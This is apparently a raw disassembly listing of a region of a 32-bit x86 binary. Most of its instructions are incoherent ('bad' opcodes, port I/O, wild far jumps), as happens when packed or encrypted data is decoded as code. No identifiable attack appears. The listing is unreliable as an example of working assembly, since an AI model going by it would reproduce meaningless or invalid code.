  404177:	mov    ebp,0xd6dae1bb
  40417c:	frstor ds:0xe1aa3b87
  404182:	repnz mov bh,0xd9
  404185:	mov    esi,0x546886e5
  40418a:	test   al,0x8d
  40418c:	jmp    0x4041a9
  40418e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40418f:	mov    ds:0x21209d69,eax
  404194:	add    ebx,edx
  404196:	inc    eax
  404197:	add    cl,BYTE PTR [eax]
  404199:	adc    dl,ch
  40419b:	add    DWORD PTR [eax+0x16],eax
  40419e:	and    ebx,DWORD PTR [edi]
  4041a0:	dec    esp
  4041a1:	ins    DWORD PTR es:[edi],dx
  4041a2:	mov    ch,ch
  4041a4:	aam    0x22
  4041a6:	cld    
  4041a7:	cwde   
  4041a8:	adc    DWORD PTR [ebx-0x7b],esi
  4041ab:	jecxz  0x404217
  4041ad:	pusha  
  4041ae:	and    bh,BYTE PTR [esp+eax*4]
  4041b1:	je     0x40416f
  4041b3:	xor    cl,BYTE PTR [eax]
  4041b5:	pop    ebp
  4041b6:	sub    DWORD PTR [eax+0x48d3f2a1],edi
  4041bc:	inc    esi
  4041bd:	jo     0x404147
  4041bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041c0:	gs and esi,edi
  4041c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041c4:	leave  
  4041c5:	and    al,0xd3
  4041c7:	rcl    DWORD PTR [ecx],cl
  4041c9:	ror    BYTE PTR [edi-0x5e6f3548],0x74
  4041d0:	ret    
  4041d1:	daa    
  4041d2:	imul   esp,edi,0xe1069bd9
  4041d8:	test   al,0x95
  4041da:	sbb    cl,BYTE PTR [edi+edx*2+0x30b658e3]
  4041e1:	pushf  
  4041e2:	mov    dl,0x21
  4041e4:	rcl    DWORD PTR [ecx+0x67],0xe0
  4041e8:	sub    ah,BYTE PTR [eax+0x50]
  4041eb:	aas    
  4041ec:	mov    es,WORD PTR [esi-0x2bcc4283]
  4041f2:	ret    0xe88e
  4041f5:	lods   eax,DWORD PTR ds:[esi]
  4041f6:	pop    edi
  4041f7:	test   BYTE PTR [ebx+edi*8-0x40],dh
  4041fb:	lea    edx,[ebp+0x30]
  4041fe:	cwde   
  4041ff:	scas   eax,DWORD PTR es:[edi]
  404200:	jle    0x4041b8
  404202:	es mov dl,0x93
  404205:	sub    eax,0xdf7cbb57
  40420a:	jnp    0x404231
  40420c:	xor    ebp,DWORD PTR [esi+0x59931c1]
  404212:	xor    eax,0xa9f853b
  404217:	lods   al,BYTE PTR ds:[esi]
  404218:	xor    edx,DWORD PTR [edi-0x6a]
  40421b:	ret    0xe8e0
  40421e:	and    BYTE PTR [edi-0x3d49721a],dl
  404224:	mov    ch,0x56
  404226:	cmp    edx,0x6a
  404229:	pusha  
  40422a:	inc    ebp
  40422b:	add    ecx,edi
  40422d:	dec    ebp
  40422e:	jb     0x4041b7
  404230:	sbb    eax,0xcfcc8369
  404235:	sub    DWORD PTR [ebx-0x7cbf26f1],edi
  40423b:	clc    
  40423c:	inc    eax
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	pmaxub mm5,QWORD PTR [esi]
  40425a:	push   ebp
  40425b:	jg     0x4042ac
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0xc770707d
  404265:	push   ecx
  404266:	dec    edx
  404267:	add    eax,0x414a32f3
  40426c:	sbb    cl,BYTE PTR [edx+0x41]
  40426f:	ds push 0x46
  404272:	pop    edi
  404273:	pusha  
  404274:	sbb    edx,esp
  404276:	sbb    DWORD PTR [edx+0x51],0x32
  40427a:	jb     0x4042ec
  40427c:	mov    cl,0x85
  40427e:	adc    al,0xe6
  404280:	out    0x12,eax
  404282:	jmp    0x404300
  404284:	mov    ebp,0x9710041
  404289:	iret   
  40428a:	mov    esp,ss
  40428c:	or     eax,edi
  40428e:	push   0x497c2660
  404293:	jnp    0x4042c2
  404295:	loop   0x404222
  404297:	addr16 xchg esi,eax
  404299:	add    ebx,DWORD PTR [ecx]
  40429b:	mov    esi,0x6b46deb9
  4042a0:	aam    0xac
  4042a2:	hlt    
  4042a3:	jmp    0x1112fc4a
  4042a8:	sub    DWORD PTR [ecx-0x3],edi
  4042ab:	mov    eax,0x70eceb15
  4042b0:	nop
  4042b1:	out    0x96,al
  4042b3:	jb     0x4042a4
  4042b5:	rcl    DWORD PTR [edx],1
  4042b7:	jmp    0xf59767ac
  4042bc:	jmp    0xe499:0x6856c101
  4042c3:	aaa    
  4042c4:	add    BYTE PTR [edi+eax*4],bl
  4042c7:	pusha  
  4042c8:	sub    al,0xac
  4042ca:	fwait
  4042cb:	out    0xee,eax
  4042cd:	jo     0x404342
  4042cf:	jb     0x404299
  4042d1:	fcom   DWORD PTR [ebx+0x3e9a6314]
  4042d7:	test   al,0x67
  4042d9:	out    0xbb,eax
  4042db:	add    al,0xd1
  4042dd:	and    al,0x16
  4042df:	xchg   esp,edi
  4042e1:	sbb    eax,0xeae94271
  4042e6:	xor    al,0xec
  4042e9:	(bad)  
  4042ea:	std    
  4042eb:	lahf   
  4042ec:	mov    esi,0xc91f7b51
  4042f1:	inc    ebp
  4042f2:	sub    al,BYTE PTR [esi-0x1f]
  4042f5:	in     al,dx
  4042f6:	arpl   WORD PTR [ebx-0x64db7206],ax
  4042fc:	iret   
  4042fd:	js     0x40433e
  4042ff:	ret    0x334e
  404302:	jbe    0x40428c
  404304:	jge    0x404298
  404306:	stos   DWORD PTR es:[edi],eax
  404307:	push   0x3e
  404309:	imul   esp,DWORD PTR [edx+0x2b157f45]
  404310:	cwde   
  404311:	jmp    0x40437f
  404313:	clc    
  404314:	test   DWORD PTR [esi-0x28af0683],esi
  40431a:	cmp    DWORD PTR [edi],0xffffffab
  40431d:	imul   edi,edi,0x7407d652
  404323:	ror    DWORD PTR [esi+esi*2],0x5b
  404327:	lea    esi,[esp+ebx*1]
  40432a:	mov    al,0x8c
  40432c:	xchg   edx,eax
  40432d:	test   BYTE PTR ds:0x4c5b8a3a,ah
  404333:	cmp    al,0x6b
  404335:	cdq    
  404336:	sar    DWORD PTR [eax+0x56],0x7f
  40433a:	out    0x2c,eax
  40433c:	hlt    
  40433d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40433e:	loop   0x4042e9
  404340:	mov    dh,0x7b
  404342:	cmp    ebx,eax
  404344:	and    eax,0xc7f89d7d
  404349:	adc    al,0xc
  40434b:	js     0x40439a
  40434d:	(bad)  
  40434e:	mov    ds,ecx
  404350:	retf   0xa170
  404353:	inc    esp
  404354:	retf   
  404355:	enter  0x5624,0xc2
  404359:	mov    ebx,0xc23c8d3c
  40435e:	xor    cl,0x7b
  404361:	pop    ebp
  404362:	rol    BYTE PTR [ebx],0xb
  404365:	inc    eax
  404366:	push   esp
  404367:	xchg   ebx,eax
  404368:	shl    DWORD PTR [eax-0x58b2d485],1
  40436e:	daa    
  40436f:	out    dx,al
  404370:	push   ebp
  404371:	mov    cl,ch
  404373:	jge    0x404333
  404375:	adc    al,0x4
  404377:	and    al,dh
  404379:	cwde   
  40437a:	repnz out 0x45,eax
  40437d:	or     eax,0x51ffd5d9
  404382:	add    bh,BYTE PTR [ecx-0x1fa78efd]
  404388:	push   0x33
  40438a:	mov    ch,0x68
  40438c:	ret    0x1104
  40438f:	push   ecx
  404390:	or     al,ch
  404392:	mov    eax,0x702cacb5
  404397:	fdiv   st,st(0)
  404399:	out    0xa,eax
  40439b:	int3   
  40439c:	out    dx,al
  40439d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40439e:	sub    ecx,DWORD PTR [eax+0x48]
  4043a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043a2:	mov    eax,ds:0xfb2cd7b4
  4043a7:	push   ebp
  4043a8:	inc    eax
  4043a9:	fidivr WORD PTR [edi+edx*2-0x4c7e2c50]
  4043b0:	xor    BYTE PTR [eax+0x7f],ch
  4043b3:	jne    0x4043b8
  4043b5:	into   
  4043b6:	jg     0x4043a8
  4043b8:	and    esp,esi
  4043ba:	mov    ss,ebx
  4043bc:	xor    esi,DWORD PTR [ebx-0x40]
  4043bf:	int3   
  4043c0:	inc    ecx
  4043c1:	mov    ?,edx
  4043c3:	cmp    BYTE PTR [eax+0x39498efa],dh
  4043c9:	xchg   ebx,eax
  4043ca:	sti    
  4043cb:	sbb    al,0xed
  4043cd:	(bad)
  4043d0:	inc    edx
  4043d1:	js     0x4043de
  4043d3:	inc    esi
  4043d4:	jg     0x4043d6
  4043d6:	fnstsw WORD PTR [ecx]
  4043d8:	mov    eax,ds:0xe4aa966d
  4043dd:	fistp  WORD PTR [eax+0xf]
  4043e0:	scas   al,BYTE PTR es:[edi]
  4043e1:	push   ebx
  4043e2:	adc    al,0xef
  4043e4:	jmpw   0x33a7
  4043e8:	pop    esi
  4043e9:	xchg   DWORD PTR [eax+0x37f5bf9c],eax
  4043ef:	outs   dx,BYTE PTR ds:[esi]
  4043f0:	jno    0x4043b7
  4043f2:	xor    edx,eax
  4043f4:	cmc    
  4043f5:	inc    ebp
  4043f6:	cdq    
  4043f7:	repnz cmp eax,0xc4d6de8d
  4043fd:	es lock cmp al,0xf5
  404401:	cmp    eax,0x173435e0
  404406:	mov    al,0x9
  404408:	out    0xfc,eax
  40440a:	enter  0x92c7,0xc
  40440e:	repz push esp
  404410:	aam    0x31
  404412:	sbb    BYTE PTR [eax-0x6f31b125],cl
  404418:	cdq    
  404419:	cmp    BYTE PTR [ebx],dh
  40441b:	pop    ebx
  40441c:	adc    eax,0xb68046f9
  404421:	popf   
  404422:	mov    dl,0x53
  404424:	ins    BYTE PTR es:[edi],dx
  404425:	imul   edi,DWORD PTR [edx-0x17c350f7],0x4c
  40442c:	(bad)  
  40442d:	push   ecx
  40442e:	ror    edi,1
  404430:	cmp    DWORD PTR [edx+0x33ae6920],esi
  404436:	mov    dh,0xd2
  404438:	ret    0x4cb8
  40443b:	or     DWORD PTR [edi+0x32],ebx
  40443e:	dec    edx
  40443f:	retf   0xf8be
  404442:	pop    es
  404443:	repnz scas eax,DWORD PTR es:[edi]
  404445:	xor    eax,0x87ff024
  40444a:	push   edx
  40444b:	lock fwait
  40444d:	nop
  40444e:	fninit 
  404450:	and    al,0xbe
  404452:	cmc    
  404453:	pop    es
  404454:	fcmovnbe st,st(5)
  404456:	clc    
  404457:	jg     0x404472
  404459:	cmp    al,0x8
  40445b:	shr    DWORD PTR [esi-0x53],cl
  40445e:	stos   BYTE PTR es:[edi],al
  40445f:	sbb    al,0xbd
  404461:	retf   
  404462:	loopne 0x4044a0
  404464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404465:	cs cmc 
  404467:	out    dx,al
  404468:	adc    BYTE PTR [edi-0x13686e7e],ch
  40446e:	mov    edi,0xe1fc960f
  404473:	loopne 0x40447d
  404475:	pop    edi
  404476:	retf   
  404477:	xor    al,0xc8
  404479:	fcom   DWORD PTR [ecx-0x6e901aac]
  40447f:	sbb    ah,dl
  404481:	icebp  
  404482:	popa   
  404483:	push   edi
  404484:	imul   ch
  404486:	gs dec edx
  404488:	lock aad 0xdc
  40448b:	inc    edi
  40448c:	sub    eax,0xbca2e303
  404491:	fidivr DWORD PTR [edx]
  404493:	mov    edx,0x5fc0cdc3
  404498:	aas    
  404499:	cs lahf 
  40449b:	xor    edi,edi
  40449d:	ffree  st(4)
  40449f:	arpl   di,di
  4044a1:	ret    0x1087
  4044a4:	imul   edi,DWORD PTR [edx],0x12cb4a0e
  4044aa:	ret    0x8af
  4044ad:	sar    DWORD PTR [ebp+0x179a659c],cl
  4044b3:	popf   
  4044b4:	js     0x4044b7
  4044b6:	or     edx,DWORD PTR [ecx]
  4044b8:	popf   
  4044b9:	mov    WORD PTR [eax],ss
  4044bb:	bound  eax,QWORD PTR [esi+0x51533141]
  4044c1:	icebp  
  4044c2:	mov    dl,0x99
  4044c4:	pop    edx
  4044c5:	scas   eax,DWORD PTR es:[edi]
  4044c6:	push   es
  4044c7:	xor    eax,0x39d29502
  4044cc:	dec    ecx
  4044cd:	(bad)  
  4044ce:	repz aas 
  4044d0:	inc    eax
  4044d1:	fwait
  4044d2:	dec    BYTE PTR [ebx-0x48]
  4044d5:	out    dx,eax
  4044d6:	inc    BYTE PTR [ecx+0x6e]
  4044d9:	loop   0x4044f9
  4044db:	aam    0xe4
  4044dd:	sub    ebx,DWORD PTR [ecx+0xd]
  4044e0:	mov    esi,0x5bb091f6
  4044e5:	lahf   
  4044e6:	pop    ss
  4044e7:	mov    ah,0x8b
  4044e9:	and    al,0x2
  4044eb:	outs   dx,BYTE PTR ds:[esi]
  4044ec:	ret    0xb065
  4044ef:	add    BYTE PTR [esi],ch
  4044f1:	fsub   st,st(1)
  4044f3:	mov    ch,0x51
  4044f5:	pop    edx
  4044f6:	aad    0xe2
  4044f8:	push   cs
  4044f9:	in     eax,0x46
  4044fb:	mov    ds:0xad9fdca0,eax
  404500:	out    0x4f,al
  404502:	mov    bh,0x49
  404504:	pop    eax
  404505:	fwait
  404506:	mov    dl,0x28
  404508:	cmp    al,0x78
  40450a:	pop    ecx
  40450b:	mov    bh,0xc1
  40450d:	repz xor BYTE PTR [ecx-0x70],ah
  404511:	jg     0x404531
  404513:	xlat   BYTE PTR ds:[ebx]
  404514:	setle  ah
  404517:	icebp  
  404518:	jge    0x404506
  40451a:	fisttp DWORD PTR [eax]
  40451c:	sahf   
  40451d:	mov    edx,0xe9c120b9
  404522:	imul   esi,esi,0x39c2b9fd
  404528:	mov    WORD PTR [eax],gs
  40452a:	jne    0x404581
  40452c:	fwait
  40452d:	rcl    BYTE PTR [edx+esi*1-0x35],cl
  404531:	jmp    0xf5012a99
  404536:	xor    esp,ecx
  404538:	sbb    edx,DWORD PTR [ebx]
  40453a:	mov    esp,0xf647d177
  40453f:	(bad)  
  404540:	jae    0x4045bc
  404542:	fist   WORD PTR ds:[edx+0x51b49c70]
  404549:	popa   
  40454a:	jns    0x404590
  40454c:	xor    dh,BYTE PTR [ebp+0x68]
  40454f:	jp     0x4045be
  404551:	ret    
  404552:	mov    dl,0x21
  404554:	into   
  404555:	fs push 0x38c862e0
  40455b:	mov    al,0x16
  40455d:	fs dec edx
  40455f:	out    dx,eax
  404560:	sub    al,0x8a
  404562:	rcl    DWORD PTR [esi+0x17],0x6d
  404566:	or     BYTE PTR ds:[bx+di-0x5c],0xab
  40456c:	mov    eax,0xe08f3eca
  404571:	test   ch,al
  404573:	loope  0x4045dc
  404575:	(bad)  
  404576:	jno    0x40456c
  404578:	stos   DWORD PTR es:[edi],eax
  404579:	jo     0x404592
  40457b:	lahf   
  40457c:	repnz dec ebx
  40457e:	dec    ecx
  40457f:	sub    BYTE PTR [edx-0x707428d5],0xd0
  404586:	sti    
  404587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404588:	out    0x0,eax
  40458a:	dec    ebx
  40458b:	aam    0xe6
  40458d:	inc    esp
  40458e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40458f:	and    al,0xa8
  404591:	jmp    0x40455a
  404593:	jmp    0x6ce9:0xadeb0cd3
  40459a:	inc    ebx
  40459b:	jmp    edx
  40459d:	loop   0x4045dc
  40459f:	stc    
  4045a0:	dec    ebp
  4045a1:	stos   DWORD PTR es:[edi],eax
  4045a2:	jne    0x4045ac
  4045a4:	mov    eax,0x820f8676
  4045a9:	adc    ecx,edi
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	mov    ch,0x11
  4045c9:	js     0x4045a8
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0x8f70707d
  4045d4:	dec    ebx
  4045d5:	lods   al,BYTE PTR ds:[esi]
  4045d6:	mov    dh,BYTE PTR [ecx]
  4045d8:	sbb    dh,0x6b
  4045db:	in     al,dx
  4045dc:	adc    al,BYTE PTR [ebx-0x62f6f7ed]
  4045e2:	lods   al,BYTE PTR ds:[esi]
  4045e3:	popf   
  4045e4:	push   esi
  4045e5:	xchg   esi,eax
  4045e6:	popf   
  4045e7:	loopne 0x40459b
  4045e9:	cmp    DWORD PTR [eax+0x8],esi
  4045ec:	dec    ecx
  4045ed:	pusha  
  4045ee:	inc    ecx
  4045ef:	inc    ecx
  4045f0:	cmc    
  4045f1:	pop    esi
  4045f2:	dec    ecx
  4045f3:	pop    esi
  4045f4:	gs mov ch,0xe0
  4045f7:	pop    esp
  4045f8:	fwait
  4045f9:	xor    ah,ch
  4045fb:	gs jne 0x40465b
  4045fe:	inc    edi
  4045ff:	dec    ebx
  404600:	pop    edi
  404601:	nop
  404602:	cmp    eax,0x2af017b6
  404607:	das    
  404608:	(bad)  
  404609:	in     al,dx
  40460a:	test   cl,cl
  40460c:	push   ecx
  40460e:	adc    esi,eax
  404610:	(bad)  
  404611:	test   DWORD PTR [esp+esi*8+0x6b],0x5bbb6a9f
  404619:	adc    BYTE PTR [ebp+0x56],dh
  40461c:	xchg   esp,eax
  40461d:	cmp    DWORD PTR [edx+eax*4-0x357139a3],edx
  404624:	mov    ebx,ds
  404626:	fcom   DWORD PTR [esi]
  404628:	out    0xa0,eax
  40462a:	lahf   
  40462b:	push   edx
  40462c:	popf   
  40462d:	dec    ebp
  40462e:	jno    0x40469d
  404630:	test   DWORD PTR [eax],edi
  404632:	push   es
  404633:	sbb    BYTE PTR [ecx+edx*4+0x1d],dh
  404637:	and    esp,DWORD PTR [ebx]
  404639:	inc    edi
  40463a:	loopne 0x404665
  40463c:	add    edi,edi
  40463e:	pop    esi
  40463f:	and    esi,eax
  404641:	out    0x5f,al
  404643:	pop    ss
  404644:	push   ebx
  404645:	fwait
  404646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404647:	or     ah,BYTE PTR [eax-0xd]
  40464a:	into   
  40464b:	inc    esi
  40464c:	dec    esp
  40464d:	jl     0x404693
  40464f:	adc    eax,0x39038b18
  404654:	mov    bl,0xdb
  404656:	inc    ecx
  404657:	fist   DWORD PTR [ecx+ebp*1]
  40465a:	pop    esi
  40465b:	push   ecx
  40465c:	aad    0x4
  40465e:	std    
  40465f:	jo     0x40468e
  404661:	mov    eax,ds:0xc8aed287
  404666:	mov    ebp,DWORD PTR [edi+0x2f2096e6]
  40466c:	call   0x24ef:0x2335eae
  404673:	pop    edx
  404674:	and    esp,ebp
  404676:	pop    ebx
  404677:	mov    ds:0x4b99c406,eax
  40467c:	cmp    DWORD PTR [eax],ebp
  40467e:	xor    al,0xf9
  404680:	push   ss
  404681:	das    
  404682:	rcr    DWORD PTR [ecx+0x460ceeee],cl
  404688:	test   BYTE PTR [esi+ecx*4-0x6644bcb8],0x3b
  404690:	mov    ebp,0x9b39b45c
  404695:	dec    ebp
  404696:	or     al,0xcb
  404698:	std    
  404699:	cmp    ax,0x4dc1
  40469d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40469e:	xchg   esi,eax
  40469f:	call   0xd4934535
  4046a4:	dec    esi
  4046a5:	bound  esp,QWORD PTR [edi+0x7f0f8461]
  4046ab:	(bad)  
  4046ac:	retf   0xf8a0
  4046af:	into   
  4046b0:	sbb    DWORD PTR [edx-0x1a],edx
  4046b3:	(bad)  
  4046b4:	xchg   ecx,eax
  4046b5:	mov    ds,WORD PTR [ebp+0x3]
  4046b8:	pushf  
  4046b9:	loope  0x40464a
  4046bb:	cmp    DWORD PTR [edi-0x4b],edx
  4046be:	scas   al,BYTE PTR es:[edi]
  4046bf:	pop    ds
  4046c0:	das    
  4046c1:	jl     0x40468e
  4046c3:	mov    cs,WORD PTR [eax-0x62]
  4046c6:	aas    
  4046c7:	inc    edi
  4046c8:	xchg   ebx,eax
  4046c9:	and    DWORD PTR [esi],eax
  4046cb:	xchg   esp,eax
  4046cc:	mov    dl,0xb9
  4046ce:	aam    0x1a
  4046d0:	cmc    
  4046d1:	mov    al,ds:0xb142344c
  4046d6:	fs je  0x404745
  4046d9:	push   ecx
  4046da:	jge    0x4046f4
  4046dc:	test   ebx,edx
  4046de:	mov    cl,0xc6
  4046e0:	int3   
  4046e1:	test   eax,0x3f65946e
  4046e6:	das    
  4046e7:	das    
  4046e8:	hlt    
  4046e9:	xchg   esi,eax
  4046ea:	cmp    edi,0x325abae1
  4046f0:	push   ds
  4046f1:	mov    ch,0x4e
  4046f3:	push   ecx
  4046f4:	(bad)  
  4046f5:	gs cmp al,0x8e
  4046f8:	adc    DWORD PTR [ecx],edi
  4046fa:	in     al,dx
  4046fb:	pop    ebp
  4046fc:	pusha  
  4046fd:	cmp    DWORD PTR [ecx],ecx
  4046ff:	iret   
  404700:	add    bh,BYTE PTR ds:0xcfea0f91
  404706:	inc    esp
  404707:	mov    eax,0x6f672628
  40470c:	push   eax
  40470d:	(bad)  
  40470e:	cmp    eax,DWORD PTR [ebx+0x1d160ee3]
  404714:	dec    esp
  404715:	pop    esi
  404716:	lds    edi,FWORD PTR es:[esi-0x167324eb]
  40471d:	loop   0x404718
  40471f:	dec    edi
  404720:	mov    dh,0x35
  404722:	fs ja  0x404797
  404725:	mov    al,0xd
  404727:	jecxz  0x4046c0
  404729:	lahf   
  40472a:	xor    al,0x98
  40472c:	aas    
  40472d:	cmp    eax,0xdb8a6239
  404732:	sub    dh,BYTE PTR [edx-0x3258db2f]
  404738:	ins    BYTE PTR es:[edi],dx
  404739:	mov    ecx,DWORD PTR [edi-0x7944f61d]
  40473f:	call   0x5bcab5d4
  404744:	mov    esi,0x8aee1d26
  404749:	inc    esp
  40474a:	fs retf 0x84c
  40474e:	mov    WORD PTR [ebx-0xb12e7c8],es
  404754:	jge    0x4047a5
  404756:	xchg   DWORD PTR [ebx-0x6e],ecx
  404759:	es scas al,BYTE PTR es:[edi]
  40475b:	and    eax,DWORD PTR [ebx+0x1a4c3a21]
  404761:	fbstp  TBYTE PTR [edi-0x25]
  404764:	stc    
  404765:	pop    ds
  404766:	sahf   
  404767:	inc    esp
  404768:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40476a:	push   cs
  40476b:	pusha  
  40476c:	fidiv  DWORD PTR es:[esi-0x7e]
  404770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404771:	sub    DWORD PTR [ebx*2-0x14fe3c6b],ebx
  404778:	add    DWORD PTR [ebx-0x2],ecx
  40477b:	pushf  
  40477c:	or     DWORD PTR [edx-0x5f05094a],edx
  404782:	loope  0x404725
  404784:	loope  0x404733
  404786:	inc    ecx
  404787:	fdivr  st,st(7)
  404789:	sahf   
  40478a:	rcl    DWORD PTR [ebx+0x68c0790d],0x47
  404791:	push   ss
  404792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404793:	mov    ebp,0x12baaa11
  404798:	aas    
  404799:	cdq    
  40479a:	cmp    BYTE PTR [edi+0x18],bh
  40479d:	out    0xb1,eax
  40479f:	(bad)  
  4047a1:	loop   0x4047e4
  4047a3:	(bad)  
  4047a4:	repz lea ebx,[esi-0x26]
  4047a8:	retf   
  4047a9:	pop    es
  4047aa:	mov    cl,0x50
  4047ac:	popf   
  4047ad:	mov    ebp,0xd05df84e
  4047b2:	ds daa 
  4047b4:	iret   
  4047b5:	push   0x69
  4047b7:	push   esi
  4047b8:	mov    al,0x8f
  4047ba:	cmp    BYTE PTR [edi+0x56],0x1d
  4047be:	in     al,0x7
  4047c0:	xchg   edx,eax
  4047c1:	push   ebp
  4047c2:	leave  
  4047c3:	int3   
  4047c4:	cli    
  4047c5:	mov    eax,ds:0x4e9edaec
  4047ca:	iret   
  4047cb:	jno    0x404827
  4047cd:	mov    bh,0x59
  4047cf:	popf   
  4047d0:	retf   
  4047d1:	outs   dx,BYTE PTR ds:[esi]
  4047d2:	inc    ebx
  4047d3:	jg     0x40480e
  4047d5:	cmp    al,0x17
  4047d7:	dec    eax
  4047d8:	cdq    
  4047d9:	imul   eax,DWORD PTR ds:0x603ecf34,0x4122b0e
  4047e3:	add    DWORD PTR [ebx],edx
  4047e5:	xchg   ebp,eax
  4047e6:	call   FWORD PTR [ebx]
  4047e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047e9:	fidiv  DWORD PTR [eax]
  4047eb:	dec    edi
  4047ec:	jo     0x40482f
  4047ee:	sub    ecx,DWORD PTR [edi+0x680d84c7]
  4047f4:	xor    al,0xe0
  4047f6:	repnz sbb al,BYTE PTR [edx+0x77]
  4047fa:	mov    edi,0x7b3e8bb8
  4047ff:	sbb    esi,edx
  404801:	clc    
  404802:	dec    eax
  404803:	fdiv   DWORD PTR ds:0x79d3c61c
  404809:	ins    DWORD PTR es:[edi],dx
  40480a:	pusha  
  40480b:	popf   
  40480c:	pop    esi
  40480d:	mov    al,ds:0xad08e109
  404812:	jae    0x40482a
  404814:	(bad)  [ebx-0x19]
  404817:	jg     0x404852
  404819:	pop    ebp
  40481a:	inc    ebx
  40481b:	imul   eax,edx,0xa3d3d008
  404821:	cmp    DWORD PTR [edx+esi*2-0x3209c591],0xd0dfbffc
  40482c:	mov    bl,BYTE PTR [eax]
  40482e:	int    0xad
  404830:	mul    BYTE PTR [edx]
  404832:	sub    dl,ch
  404834:	or     esp,eax
  404836:	push   ds
  404837:	fnsave [ecx+0x51bfabcc]
  40483d:	mov    ebx,0x13400ea1
  404842:	xchg   BYTE PTR [ebp-0x70f8ef1b],ah
  404848:	sub    BYTE PTR [edx],ch
  40484a:	add    dl,BYTE PTR ds:0x6026da51
  404850:	in     eax,0xb3
  404852:	stos   DWORD PTR es:[edi],eax
  404853:	pop    ebp
  404854:	fild   WORD PTR [ebp+0x3c]
  404857:	add    BYTE PTR [edx-0xe],ch
  40485a:	mov    DWORD PTR [edx],edi
  40485c:	loopne 0x40486f
  40485e:	fisub  DWORD PTR [eax]
  404860:	cmp    ebp,DWORD PTR [edx-0x4c7b044b]
  404866:	sti    
  404867:	ss adc eax,0xc9b9681f
  40486d:	pop    eax
  40486e:	jno    0x4048e6
  404870:	retf   0xdcd0
  404873:	call   0xa9ab9908
  404878:	push   ds
  404879:	jmp    0x25a4:0xb89eb8d6
  404880:	rcr    DWORD PTR [esi],1
  404882:	jnp    0x40488b
  404884:	xchg   ecx,eax
  404885:	mov    cl,0x42
  404887:	xor    dh,BYTE PTR [eax-0x3299c493]
  40488d:	jne    0x4048d9
  40488f:	dec    esp
  404890:	data16 fsubr DWORD PTR [ecx-0x7f]
  404894:	or     BYTE PTR [edx-0x5f0dd4be],cl
  40489a:	mov    bh,0xd9
  40489c:	pop    eax
  40489d:	retf   0x6764
  4048a0:	and    eax,DWORD PTR [edx+0x3c]
  4048a3:	aad    0x7
  4048a5:	cmp    BYTE PTR [eax-0x2de07a13],al
  4048ab:	ins    DWORD PTR es:[edi],dx
  4048ac:	daa    
  4048ad:	jecxz  0x404927
  4048af:	mov    DWORD PTR ds:0xdb274c5b,ebp
  4048b5:	add    ebx,ebx
  4048b7:	leave  
  4048b8:	in     eax,dx
  4048b9:	sbb    edx,ebx
  4048bb:	inc    ecx
  4048bc:	ret    
  4048bd:	xchg   DWORD PTR [ebx+0x42],ecx
  4048c0:	mov    ds:0xdb84195f,al
  4048c5:	int3   
  4048c6:	jle    0x40492a
  4048c8:	imul   ebx,esi,0xffffff94
  4048cb:	lea    esp,[ebx]
  4048cd:	xlat   BYTE PTR ds:[ebx]
  4048ce:	inc    ecx
  4048cf:	mov    dl,0x2c
  4048d1:	push   es
  4048d2:	xchg   BYTE PTR [ebp+0x78],dl
  4048d5:	pushf  
  4048d6:	or     BYTE PTR [edi-0x52a4fd3b],bl
  4048dc:	nop
  4048dd:	fistp  DWORD PTR [esi-0x20bf35f7]
  4048e3:	shl    BYTE PTR ss:[ebx-0x42],0x62
  4048e8:	and    al,cl
  4048ea:	sub    dh,0xda
  4048ed:	add    eax,0x7c8ee0a3
  4048f2:	lar    esp,dx
  4048f5:	cwde   
  4048f6:	rcr    esi,cl
  4048f8:	rcl    DWORD PTR [ecx+edx*1-0x2ad903c7],cl
  4048ff:	sbb    dl,dh
  404901:	icebp  
  404902:	sbb    DWORD PTR [eax],eax
  404904:	icebp  
  404905:	test   eax,0xa52e0db7
  40490a:	in     eax,dx
  40490b:	(bad)  
  40490c:	imul   eax,DWORD PTR [edi],0x6
  40490f:	push   esp
  404910:	pusha  
  404911:	hlt    
  404912:	xchg   edi,eax
  404913:	mov    eax,0x458bc867
  404918:	hlt    
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
